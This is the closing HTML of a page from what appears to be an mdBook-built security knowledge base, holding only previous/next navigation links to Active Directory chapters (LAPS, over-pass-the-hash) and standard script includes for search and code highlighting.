                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../windows-hardening/active-directory-methodology/laps.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../windows-hardening/active-directory-methodology/laps.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
